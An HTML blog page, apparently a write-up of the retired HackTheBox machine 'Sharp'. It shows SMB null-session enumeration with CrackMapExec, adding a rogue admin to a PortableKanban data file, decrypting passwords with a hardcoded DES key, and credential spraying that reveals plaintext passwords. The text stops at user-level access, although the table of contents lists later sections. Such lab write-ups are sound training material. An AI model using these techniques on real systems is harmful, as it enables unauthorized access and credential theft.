@@ -1,0 +1,584 @@
+<!DOCTYPE html>
+<html lang="en"><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  <meta charset="utf-8" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+   <meta name="description" content="Hi, after a long time not posting anything on this blog because of my university workload. Let&rsquo;s get back to our normal routine of pwning. Today, I will do a writeup of retired HackTheBox (HTB) machine - Sharp, which is rated 4.8 pts.
+For anyone who doesn&rsquo;t know about HTB, it&rsquo;s an infosec playground with a bunch of virtual machines which are vulnerable to exploit. HTB, in my point of view, is the most practical cyber security competition as many certificate authorities require completion of HTB-like target machines.">  
+
+  <title>
+    
+      HackTheBox: Sharp
+    
+  </title>
+
+  
+  <link rel="shortcut icon" type="image/x-icon" href="/favicon/green.png" />
+
+  
+  
+  
+  <link rel="stylesheet" href="//localhost:1313/css/main.f3fa33b7405523e26c3513ae28d727c60efcaaa6c532b418812d08f71cb380419ee24a4e53a155d97b0879f61144b0476768c589c47485ffa080cbc5a4cd85f2.css" integrity="sha512-8/ozt0BVI&#43;JsNROuKNcnxg78qqbFMrQYgS0I9xyzgEGe4kpOU6FV2XsIefYRRLBHZ2jFicR0hf&#43;ggMvFpM2F8g==" />
+  
+
+  
+  <script defer type="text/javascript" src="//localhost:1313/js/jquery_3.7.1.min.js"></script>
+  
+  
+  
+  <script defer type="text/javascript" src="//localhost:1313/js/typing_effect.min.js"></script>
+
+  
+  
+  <script defer type="text/javascript" src="//localhost:1313/js/img_relocs.min.js"></script>
+</head>
+<body a="dark">
+        <main class="page-content" aria-label="Content">
+            <div class="w">
+<a style="color: #ff5;" href="/">[HOME]</a>
+
+<article>
+    <p class="post-meta">
+        
+        <time datetime="2021-05-16 09:30:00 &#43;1345 &#43;1345">
+            2021-05-16
+        </time>
+    </p>
+
+    <h1>HackTheBox: Sharp</h1>
+
+    
+        <aside >
+            <nav id="TableOfContents">
+  <ul>
+    <li><a href="#enumeration">Enumeration</a>
+      <ul>
+        <li><a href="#nmap-output">Nmap output</a></li>
+        <li><a href="#in-depth-enumeration-with-crackmapexec-cme">In-depth enumeration with CrackMapExec (CME)</a></li>
+      </ul>
+    </li>
+    <li><a href="#kanban-share-files">Kanban share files</a>
+      <ul>
+        <li><a href="#reveal-administrator-password-by-re-configurating-kanban-pk3-file">Reveal administrator password by re-configurating Kanban PK3 file</a></li>
+        <li><a href="#alternative-method">Alternative method</a></li>
+        <li><a href="#credentials-spraying-with-cme">Credentials spraying with CME</a></li>
+        <li><a href="#credentials-acquired">Credentials acquired</a></li>
+      </ul>
+    </li>
+    <li><a href="#user-level-access">User-level access</a>
+      <ul>
+        <li><a href="#credentials-acquired-1">Credentials acquired</a></li>
+      </ul>
+    </li>
+    <li><a href="#exploit-local-net-debug-service">Exploit local .NET debug service</a>
+      <ul>
+        <li><a href="#payload-crafting-and-network-configuration">Payload crafting and Network configuration</a></li>
+        <li><a href="#powershell-reverse-connection">PowerShell Reverse Connection</a></li>
+        <li><a href="#another-secret-endpoint-and-flag">Another secret endpoint and &hellip;flag!</a></li>
+      </ul>
+    </li>
+    <li><a href="#footnotes">Footnotes</a></li>
+  </ul>
+</nav>
+        </aside>
+    
+
+    <p>Hi, after a long time not posting anything on this blog because of my university workload. Let&rsquo;s get back to our normal routine of pwning. Today, I will do a writeup of retired <a href="https://www.hackthebox.eu/">HackTheBox</a> (HTB) machine - Sharp, which is rated 4.8 pts.</p>
+<p>For anyone who doesn&rsquo;t know about HTB, it&rsquo;s an infosec playground with a bunch of virtual machines which are vulnerable to exploit. HTB, in my point of view, is the most practical cyber security competition as many certificate authorities require completion of HTB-like target machines.</p>
+<h2 id="enumeration"><a class="h-anchor" href="#enumeration">Enumeration</a></h2>
+<p>On the very first step, we want to do a nmap scan on the target (10.10.10.219).</p>
+<h3 id="nmap-output"><a class="h-anchor" href="#nmap-output">Nmap output</a></h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#0f0"># Nmap 7.91 scan initiated Thu May 13 05:42:14 2021 as: nmap -sC -sV -oA nmap/sharp -v 10.10.10.219</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#f00">for</span> 10.10.10.219
+</span></span><span style="display:flex;"><span>Host is up (0.23s latency).
+</span></span><span style="display:flex;"><span>Not shown: <span style="color:#f60">996</span> filtered ports
+</span></span><span style="display:flex;"><span>PORT     STATE SERVICE            VERSION
+</span></span><span style="display:flex;"><span>135/tcp  open  msrpc              Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>139/tcp  open  netbios-ssn        Microsoft Windows netbios-ssn
+</span></span><span style="display:flex;"><span>445/tcp  open  microsoft-ds?
+</span></span><span style="display:flex;"><span>8888/tcp open  storagecraft-image StorageCraft Image Manager
+</span></span><span style="display:flex;"><span>Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Host script results:
+</span></span><span style="display:flex;"><span>|_clock-skew: -48m56s
+</span></span><span style="display:flex;"><span>| smb2-security-mode: 
+</span></span><span style="display:flex;"><span>|   2.02: 
+</span></span><span style="display:flex;"><span>|_    Message signing enabled but not required
+</span></span><span style="display:flex;"><span>| smb2-time: 
+</span></span><span style="display:flex;"><span>|   date: 2021-05-13T08:54:52
+</span></span><span style="display:flex;"><span>|_  start_date: N/A
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Read data files from: /usr/bin/../share/nmap
+</span></span><span style="display:flex;"><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#f00">done</span> at Thu May <span style="color:#f60">13</span> 05:44:27 <span style="color:#f60">2021</span> -- <span style="color:#f60">1</span> IP address (<span style="color:#f60">1</span> host up) scanned in 133.29 seconds
+</span></span></code></pre></div><p>Nmap results provide us with different ports and services currently running on the remote host. However, we probably should focus on its SMB service.</p>
+<h3 id="in-depth-enumeration-with-crackmapexec-cme"><a class="h-anchor" href="#in-depth-enumeration-with-crackmapexec-cme">In-depth enumeration with CrackMapExec (CME)</a></h3>
+<p>Instead of the old-fashioned Metasploit&rsquo;s auxiliaries/scanners, CrackMapExec (CME) can help us empower our exploitation to a new level. You can install the tool with a single line</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ apt-get install crackmapexec
+</span></span></code></pre></div><p>or you can have it by cloning into <a href="https://github.com/byt3bl33d3r">byt3bl33d3r</a>/<strong><a href="https://github.com/byt3bl33d3r/CrackMapExec">CrackMapExec</a></strong> but you will need <a href="https://python-poetry.org/docs/#installation">Poetry</a> to manage dependencies.</p>
+<h4 id="os-version"><a class="h-anchor" href="#os-version">OS version</a></h4>
+<p>Now, let&rsquo;s check our target&rsquo;s OS version using CME (Windows 10.0 Build 17763 x64).</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>┌──(root💀kali)-[/home/…/HackTheBox/Sharp/opt/CrackMapExec]
+</span></span><span style="display:flex;"><span>└─# poetry run crackmapexec.spec smb 10.10.10.219         
+</span></span><span style="display:flex;"><span>SMB         10.10.10.219    <span style="color:#f60">445</span>    SHARP            [*] Windows 10.0 Build <span style="color:#f60">17763</span> x64 (name:SHARP) (domain:Sharp) (signing:False) (SMBv1:False)
+</span></span></code></pre></div><h4 id="shared-objects--access"><a class="h-anchor" href="#shared-objects--access">Shared objects &amp; Access</a></h4>
+<p>Next, I&rsquo;d like to login using empty username and password, a null-session, to get some free share-objects on the machine.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──(root💀kali)-[/home/…/HackTheBox/Sharp/opt/CrackMapExec]
+</span></span><span style="display:flex;"><span>└─# poetry run crackmapexec.spec smb 10.10.10.219 -u <span style="color:#87ceeb">&#39;&#39;</span> -p <span style="color:#87ceeb">&#39;&#39;</span> --shares  
+</span></span><span style="display:flex;"><span>SMB         10.10.10.219    <span style="color:#f60">445</span>    SHARP            [*] Windows 10.0 Build <span style="color:#f60">17763</span> x64 (name:SHARP) (domain:Sharp) (signing:False) (SMBv1:False)
+</span></span><span style="display:flex;"><span>SMB         10.10.10.219    <span style="color:#f60">445</span>    SHARP            [-] Sharp<span style="color:#87ceeb">\:</span> STATUS_ACCESS_DENIED 
+</span></span><span style="display:flex;"><span>SMB         10.10.10.219    <span style="color:#f60">445</span>    SHARP            [+] Enumerated shares
+</span></span><span style="display:flex;"><span>SMB         10.10.10.219    <span style="color:#f60">445</span>    SHARP            Share           Permissions     Remark
+</span></span><span style="display:flex;"><span>SMB         10.10.10.219    <span style="color:#f60">445</span>    SHARP            -----           -----------     ------
+</span></span><span style="display:flex;"><span>SMB         10.10.10.219    <span style="color:#f60">445</span>    SHARP            ADMIN$                          Remote Admin
+</span></span><span style="display:flex;"><span>SMB         10.10.10.219    <span style="color:#f60">445</span>    SHARP            C$                              Default share
+</span></span><span style="display:flex;"><span>SMB         10.10.10.219    <span style="color:#f60">445</span>    SHARP            dev                             
+</span></span><span style="display:flex;"><span>SMB         10.10.10.219    <span style="color:#f60">445</span>    SHARP            IPC$                            Remote IPC
+</span></span><span style="display:flex;"><span>SMB         10.10.10.219    <span style="color:#f60">445</span>    SHARP            kanban          READ            
+</span></span></code></pre></div><p>The most notable one here is the <code>kanban</code> share-directory because we don&rsquo;t know what that is, indeed. A quick search on Google provides us that Kanban is a project management framework between users so that we can figure out it might contain important credentials.</p>
+<h4 id="spider_plus-json"><a class="h-anchor" href="#spider_plus-json">Spider_plus JSON</a></h4>
+<p>Another thing you can do with CME is using its modules, in this case is <code>spider_plus</code> to crawl information from target host (directories, file names, sizes, &hellip;) and save it as JSON under <code>/tmp/cme_spider_plus</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──(root💀kali)-[/home/…/HackTheBox/Sharp/opt/CrackMapExec]
+</span></span><span style="display:flex;"><span>└─# poetry run crackmapexec.spec smb 10.10.10.219 -u <span style="color:#87ceeb">&#39;&#39;</span> -p <span style="color:#87ceeb">&#39;&#39;</span> -M spider_plus 
+</span></span><span style="display:flex;"><span>SMB         10.10.10.219    <span style="color:#f60">445</span>    SHARP            [*] Windows 10.0 Build <span style="color:#f60">17763</span> x64 (name:SHARP) (domain:Sharp) (signing:False) (SMBv1:False)
+</span></span><span style="display:flex;"><span>SMB         10.10.10.219    <span style="color:#f60">445</span>    SHARP            [-] Sharp<span style="color:#87ceeb">\:</span> STATUS_ACCESS_DENIED 
+</span></span><span style="display:flex;"><span>SPIDER_P... 10.10.10.219    <span style="color:#f60">445</span>    SHARP            [*] Started spidering plus with option:
+</span></span><span style="display:flex;"><span>SPIDER_P... 10.10.10.219    <span style="color:#f60">445</span>    SHARP            [*]        DIR: [<span style="color:#87ceeb">&#39;print$&#39;</span>]
+</span></span><span style="display:flex;"><span>SPIDER_P... 10.10.10.219    <span style="color:#f60">445</span>    SHARP            [*]        EXT: [<span style="color:#87ceeb">&#39;ico&#39;</span>, <span style="color:#87ceeb">&#39;lnk&#39;</span>]
+</span></span><span style="display:flex;"><span>SPIDER_P... 10.10.10.219    <span style="color:#f60">445</span>    SHARP            [*]       SIZE: <span style="color:#f60">51200</span>
+</span></span><span style="display:flex;"><span>SPIDER_P... 10.10.10.219    <span style="color:#f60">445</span>    SHARP            [*]     OUTPUT: /tmp/cme_spider_plus
+</span></span></code></pre></div><p>So organized, isn&rsquo;t it?</p>
+<p><img src="https://github.com/legiahuyy/image-host/raw/main/2021-5-14-HTB-Sharp/2021-05-14_11-22.png"></p>
+<p>These are all the items we can enumerate with a null-session.</p>
+<h2 id="kanban-share-files"><a class="h-anchor" href="#kanban-share-files">Kanban share files</a></h2>
+<p>Using smbclient to connect to <code>kanban</code> directory on remote machine and download files back to our Linux.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#0f0"># Connect to remote host with null credentials</span>
+</span></span><span style="display:flex;"><span>$ smbclient -N //10.10.10.219/kanban
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#0f0"># Download all existing files</span>
+</span></span><span style="display:flex;"><span>smb: <span style="color:#87ceeb">\&gt;</span> mget *
+</span></span></code></pre></div><p>You might want to take a look at those <code>.pk3</code> and <code>PortableKanban.exe</code> files as aforementioned, they are likely to contain useful information.</p>
+<p><img src="https://github.com/legiahuyy/image-host/raw/main/2021-5-14-HTB-Sharp/2021-05-14_11-32.png"></p>
+<p>After downloading, you can extract the <code>pkb.zip</code> using <code>unzip</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──(root💀kali)-[/home/…/Sharp/smb/kanban/pkb]
+</span></span><span style="display:flex;"><span>└─# unzip pkb.zip     
+</span></span><span style="display:flex;"><span>Archive:  pkb.zip
+</span></span><span style="display:flex;"><span>  inflating: CommandLine.dll         
+</span></span><span style="display:flex;"><span>  inflating: CsvHelper.dll           
+</span></span><span style="display:flex;"><span>  inflating: DotNetZip.dll           
+</span></span><span style="display:flex;"><span>  inflating: Itenso.Rtf.Converter.Html.dll  
+</span></span><span style="display:flex;"><span>  inflating: Itenso.Rtf.Interpreter.dll  
+</span></span><span style="display:flex;"><span>  inflating: Itenso.Rtf.Parser.dll   
+</span></span><span style="display:flex;"><span>  inflating: Itenso.Sys.dll          
+</span></span><span style="display:flex;"><span>  inflating: MsgReader.dll           
+</span></span><span style="display:flex;"><span>  inflating: Ookii.Dialogs.dll       
+</span></span><span style="display:flex;"><span>   creating: Plugins/
+</span></span><span style="display:flex;"><span>  inflating: Plugins/PluginsLibrary.dll  
+</span></span><span style="display:flex;"><span>  inflating: PortableKanban.Data.dll  
+</span></span><span style="display:flex;"><span>  inflating: PortableKanban.exe      
+</span></span><span style="display:flex;"><span>  inflating: PortableKanban.Extensions.dll  
+</span></span><span style="display:flex;"><span>  inflating: ServiceStack.Common.dll  
+</span></span><span style="display:flex;"><span>  inflating: ServiceStack.Interfaces.dll  
+</span></span><span style="display:flex;"><span>  inflating: ServiceStack.Redis.dll  
+</span></span><span style="display:flex;"><span>  inflating: ServiceStack.Text.dll   
+</span></span><span style="display:flex;"><span>  inflating: User Guide.pdf
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>┌──(kali㉿kali)-[~/HackTheBox/Sharp/smb/kanban]
+</span></span><span style="display:flex;"><span>└─$ md5sum PortableKanban.pk*
+</span></span><span style="display:flex;"><span>0e3d7c07174011699fa4e1d29f02662b  PortableKanban.pk3
+</span></span><span style="display:flex;"><span>0e3d7c07174011699fa4e1d29f02662b  PortableKanban.pk3.bak
+</span></span><span style="display:flex;"><span>02c445fdc6a8b05ea23cd821534442e5  PortableKanban.pk3.md5
+</span></span><span style="display:flex;"><span>   
+</span></span></code></pre></div><p>Skim through the files and we have these users in <code>PortableKanban.pk3</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>/* PortableKanban.pk<span style="color:#f60">3</span> */
+</span></span><span style="display:flex;"><span>  <span style="color:#87ceeb">&#34;Users&#34;</span>: [
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>      &#34;Id&#34;: <span style="color:#87ceeb">&#34;e8e29158d70d44b1a1ba4949d52790a0&#34;</span>,
+</span></span><span style="display:flex;"><span>      &#34;Name&#34;: <span style="color:#87ceeb">&#34;Administrator&#34;</span>,
+</span></span><span style="display:flex;"><span>      &#34;Initials&#34;: <span style="color:#87ceeb">&#34;&#34;</span>,
+</span></span><span style="display:flex;"><span>      &#34;Email&#34;: <span style="color:#87ceeb">&#34;&#34;</span>,
+</span></span><span style="display:flex;"><span>      &#34;EncryptedPassword&#34;: <span style="color:#87ceeb">&#34;k+iUoOvQYG98PuhhRC7/rg==&#34;</span>, <span style="color:#0f0">// Base64
+</span></span></span><span style="display:flex;"><span><span style="color:#0f0"></span>      &#34;Role&#34;: <span style="color:#87ceeb">&#34;Admin&#34;</span>,
+</span></span><span style="display:flex;"><span>      &#34;Inactive&#34;: <span style="color:#f00">false</span>,
+</span></span><span style="display:flex;"><span>      &#34;TimeStamp&#34;: <span style="color:#f60">637409769245503700</span>
+</span></span><span style="display:flex;"><span>    },
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>      &#34;Id&#34;: <span style="color:#87ceeb">&#34;0628ae1de5234b81ae65c246dd2b4a21&#34;</span>,
+</span></span><span style="display:flex;"><span>      &#34;Name&#34;: <span style="color:#87ceeb">&#34;lars&#34;</span>,
+</span></span><span style="display:flex;"><span>      &#34;Initials&#34;: <span style="color:#87ceeb">&#34;&#34;</span>,
+</span></span><span style="display:flex;"><span>      &#34;Email&#34;: <span style="color:#87ceeb">&#34;&#34;</span>,
+</span></span><span style="display:flex;"><span>      &#34;EncryptedPassword&#34;: <span style="color:#87ceeb">&#34;Ua3LyPFM175GN8D3+tqwLA==&#34;</span>,
+</span></span><span style="display:flex;"><span>      &#34;Role&#34;: <span style="color:#87ceeb">&#34;User&#34;</span>,
+</span></span><span style="display:flex;"><span>      &#34;Inactive&#34;: <span style="color:#f00">false</span>,
+</span></span><span style="display:flex;"><span>      &#34;TimeStamp&#34;: <span style="color:#f60">637409769265925600</span>
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>  ]
+</span></span></code></pre></div><h3 id="reveal-administrator-password-by-re-configurating-kanban-pk3-file"><a class="h-anchor" href="#reveal-administrator-password-by-re-configurating-kanban-pk3-file">Reveal administrator password by re-configurating Kanban PK3 file</a></h3>
+<p>Since the passwords are encrypted, we need to find other ways to get in. We can abuse their own <code>PortableKanban.exe</code> to decrypt passwords for us since they are stored offline but you&rsquo;ve might already known that only privileged users can read the password in plain text. Let&rsquo;s add ourselves in with <em>Admin</em> role by copy-paste <code>Administrator</code> section and change the name and id.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>/* PortableKanban.pk<span style="color:#f60">3</span> */
+</span></span><span style="display:flex;"><span>	<span style="color:#87ceeb">&#34;Users&#34;</span>: [
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>      &#34;Id&#34;: <span style="color:#87ceeb">&#34;e8e29158d70d44b1a1ba4949d52790a0&#34;</span>,
+</span></span><span style="display:flex;"><span>      &#34;Name&#34;: <span style="color:#87ceeb">&#34;Administrator&#34;</span>,
+</span></span><span style="display:flex;"><span>      &#34;Initials&#34;: <span style="color:#87ceeb">&#34;&#34;</span>,
+</span></span><span style="display:flex;"><span>      &#34;Email&#34;: <span style="color:#87ceeb">&#34;&#34;</span>,
+</span></span><span style="display:flex;"><span>      &#34;EncryptedPassword&#34;: <span style="color:#87ceeb">&#34;k+iUoOvQYG98PuhhRC7/rg==&#34;</span>,
+</span></span><span style="display:flex;"><span>      &#34;Role&#34;: <span style="color:#87ceeb">&#34;Admin&#34;</span>,
+</span></span><span style="display:flex;"><span>      &#34;Inactive&#34;: <span style="color:#f00">false</span>,
+</span></span><span style="display:flex;"><span>      &#34;TimeStamp&#34;: <span style="color:#f60">637409769245503700</span>
+</span></span><span style="display:flex;"><span>    },
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>      &#34;Id&#34;: <span style="color:#87ceeb">&#34;0628ae1de5234b81ae65c246dd2b4a21&#34;</span>,
+</span></span><span style="display:flex;"><span>      &#34;Name&#34;: <span style="color:#87ceeb">&#34;lars&#34;</span>,
+</span></span><span style="display:flex;"><span>      &#34;Initials&#34;: <span style="color:#87ceeb">&#34;&#34;</span>,
+</span></span><span style="display:flex;"><span>      &#34;Email&#34;: <span style="color:#87ceeb">&#34;&#34;</span>,
+</span></span><span style="display:flex;"><span>      &#34;EncryptedPassword&#34;: <span style="color:#87ceeb">&#34;Ua3LyPFM175GN8D3+tqwLA==&#34;</span>,
+</span></span><span style="display:flex;"><span>      &#34;Role&#34;: <span style="color:#87ceeb">&#34;User&#34;</span>,
+</span></span><span style="display:flex;"><span>      &#34;Inactive&#34;: <span style="color:#f00">false</span>,
+</span></span><span style="display:flex;"><span>      &#34;TimeStamp&#34;: <span style="color:#f60">637409769265925600</span>
+</span></span><span style="display:flex;"><span>    },
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>      &#34;Id&#34;: <span style="color:#87ceeb">&#34;e8e29158d70d44b1a1ba4949d52790a1&#34;</span>, <span style="color:#0f0">// We also have to change the id
+</span></span></span><span style="display:flex;"><span><span style="color:#0f0"></span>      &#34;Name&#34;: <span style="color:#87ceeb">&#34;huy&#34;</span>,
+</span></span><span style="display:flex;"><span>      &#34;Initials&#34;: <span style="color:#87ceeb">&#34;&#34;</span>,
+</span></span><span style="display:flex;"><span>      &#34;Email&#34;: <span style="color:#87ceeb">&#34;&#34;</span>,
+</span></span><span style="display:flex;"><span>      &#34;EncryptedPassword&#34;: <span style="color:#87ceeb">&#34;&#34;</span>, 					<span style="color:#0f0">// Empty password
+</span></span></span><span style="display:flex;"><span><span style="color:#0f0"></span>      &#34;Role&#34;: <span style="color:#87ceeb">&#34;Admin&#34;</span>,
+</span></span><span style="display:flex;"><span>      &#34;Inactive&#34;: <span style="color:#f00">false</span>,
+</span></span><span style="display:flex;"><span>      &#34;TimeStamp&#34;: <span style="color:#f60">637409769245503700</span>
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>  ]
+</span></span></code></pre></div><p>Then we execute <code>PortableKanban.exe</code>, open Users tab in the setup dialog and we are now able to read the passwords.</p>
+<p><img src="https://github.com/legiahuyy/image-host/raw/main/2021-5-14-HTB-Sharp/2021-05-14_14-13.png"></p>
+<h3 id="alternative-method"><a class="h-anchor" href="#alternative-method">Alternative method</a></h3>
+<p>If you love doing thing <em>the-hard-way</em>, feel free to reverse the program and reproduce its decrypt method. Luckily, <code>PortableKanban.exe</code> and its components are compiled in C# which makes it easier for us.</p>
+<p><img src="https://github.com/legiahuyy/image-host/raw/main/2021-5-14-HTB-Sharp/2021-05-14_11-55.png"></p>
+<h4 id="finding-credentials-with-dnspy"><a class="h-anchor" href="#finding-credentials-with-dnspy">Finding credentials with dnSpy</a></h4>
+<p>Load the target&rsquo;s executables and DLLs  in dnSpy, we can have their decrypt method. The <code>Decrypt</code> function reads encrypted string as input, then uses <code>DESCryptoServiceProvider</code> with hardcoded key and IV to decrypt our string.</p>
+<p><img alt="Crypto.Decrypt" src="https://github.com/legiahuyy/image-host/raw/main/2021-5-14-HTB-Sharp/2021-05-14_14-21.png"></p>
+<p>On line 62 and 65, from two magic bytes called <code>_rgbKey</code> and <code>_rgbIV</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c#" data-lang="c#"><span style="display:flex;"><span>		<span style="color:#0f0">// Token: 0x04000001 RID: 1</span>
+</span></span><span style="display:flex;"><span>		<span style="color:#f00">private</span> <span style="color:#f00">static</span> <span style="color:#ee82ee">byte</span>[] _rgbKey = Encoding.ASCII.GetBytes(<span style="color:#87ceeb">&#34;7ly6UznJ&#34;</span>); <span style="color:#0f0">// Hex: 376c7936557a6e4a</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>		<span style="color:#0f0">// Token: 0x04000002 RID: 2</span>
+</span></span><span style="display:flex;"><span>		<span style="color:#f00">private</span> <span style="color:#f00">static</span> <span style="color:#ee82ee">byte</span>[] _rgbIV = Encoding.ASCII.GetBytes(<span style="color:#87ceeb">&#34;XuVUm5fR&#34;</span>);	<span style="color:#0f0">// Hex: 587556556d356652</span>
+</span></span></code></pre></div><p>Talk a little about DES cipher, people use two common mode which are CBC (<strong>cipher block chaining</strong>) and ECB (<strong>electronic code book</strong>). But only CBC supports key and IV in combination to generate the block cipher.</p>
+<p><img alt="Source: Wikipedia" src="https://upload.wikimedia.org/wikipedia/commons/d/d3/Cbc_encryption.png"></p>
+<p>So we are able to decrypt the password using <a href="https://gchq.github.io/CyberChef/">CyberChef</a> with the following recipe will give us our plain password.</p>
+<p><img src="https://github.com/legiahuyy/image-host/raw/main/2021-5-14-HTB-Sharp/2021-05-14_14-32.png"></p>
+<h3 id="credentials-spraying-with-cme"><a class="h-anchor" href="#credentials-spraying-with-cme">Credentials spraying with CME</a></h3>
+<p>In this step, we will correspondingly put our usernames and passwords in two separate text file and let CME do the verification job for us.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#0f0"># users.txt                   </span>
+</span></span><span style="display:flex;"><span>lars
+</span></span><span style="display:flex;"><span>Administrator
+</span></span><span style="display:flex;"><span>                                                                                                    
+</span></span><span style="display:flex;"><span><span style="color:#0f0"># passwords.txt </span>
+</span></span><span style="display:flex;"><span>G123HHrth234gRG
+</span></span><span style="display:flex;"><span>G2@<span style="color:#eedd82">$btRSHJYTarg</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>┌──(root💀kali)-[/home/…/HackTheBox/Sharp/opt/CrackMapExec]
+</span></span><span style="display:flex;"><span>└─# poetry run crackmapexec.spec smb 10.10.10.219 -u ../../users.txt -p ../../passwords.txt 
+</span></span><span style="display:flex;"><span>SMB         10.10.10.219    <span style="color:#f60">445</span>    SHARP            [*] Windows 10.0 Build <span style="color:#f60">17763</span> x64 (name:SHARP) (domain:Sharp) (signing:False) (SMBv1:False)
+</span></span><span style="display:flex;"><span>SMB         10.10.10.219    <span style="color:#f60">445</span>    SHARP            [+] Sharp<span style="color:#87ceeb">\l</span>ars:G123HHrth234gRG 
+</span></span></code></pre></div><p>Only <code>lars</code> can log in so we should excluded Administrator credentials for now.</p>
+<h3 id="credentials-acquired"><a class="h-anchor" href="#credentials-acquired">Credentials acquired</a></h3>
+<table>
+<thead>
+<tr>
+<th>Username</th>
+<th>Password</th>
+<th>Status</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Administrator</td>
+<td>G2@$btRSHJYTarg</td>
+<td>Invalid</td>
+</tr>
+<tr>
+<td>lars</td>
+<td>G123HHrth234gRG</td>
+<td>Valid</td>
+</tr>
+</tbody>
+</table>
+<h2 id="user-level-access"><a class="h-anchor" href="#user-level-access">User-level access</a></h2>
+<p>After using <code>lars</code> credentials, we are able to crawl his shared-objects with <code>spider_plus</code> module as following:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──(root💀kali)-[/home/…/HackTheBox/Sharp/opt/CrackMapExec]
+</span></span><span style="display:flex;"><span>└─# poetry run crackmapexec.spec smb 10.10.10.219 -u lars -p G123HHrth234gRG -M spider_plus     <span style="color:#f60">2</span> ⨯
+</span></span><span style="display:flex;"><span>SMB         10.10.10.219    <span style="color:#f60">445</span>    SHARP            [*] Windows 10.0 Build <span style="color:#f60">17763</span> x64 (name:SHARP) (domain:Sharp) (signing:False) (SMBv1:False)
+</span></span><span style="display:flex;"><span>SMB         10.10.10.219    <span style="color:#f60">445</span>    SHARP            [+] Sharp<span style="color:#87ceeb">\l</span>ars:G123HHrth234gRG 
+</span></span><span style="display:flex;"><span>SPIDER_P... 10.10.10.219    <span style="color:#f60">445</span>    SHARP            [*] Started spidering plus with option:
+</span></span><span style="display:flex;"><span>SPIDER_P... 10.10.10.219    <span style="color:#f60">445</span>    SHARP            [*]        DIR: [<span style="color:#87ceeb">&#39;print$&#39;</span>]
+</span></span><span style="display:flex;"><span>SPIDER_P... 10.10.10.219    <span style="color:#f60">445</span>    SHARP            [*]        EXT: [<span style="color:#87ceeb">&#39;ico&#39;</span>, <span style="color:#87ceeb">&#39;lnk&#39;</span>]
+</span></span><span style="display:flex;"><span>SPIDER_P... 10.10.10.219    <span style="color:#f60">445</span>    SHARP            [*]       SIZE: <span style="color:#f60">51200</span>
+</span></span><span style="display:flex;"><span>SPIDER_P... 10.10.10.219    <span style="color:#f60">445</span>    SHARP            [*]     OUTPUT: /tmp/cme_spider_plus
+</span></span></code></pre></div><p>We made the <code>.json</code> more readable by filtering out the time and file size.</p>
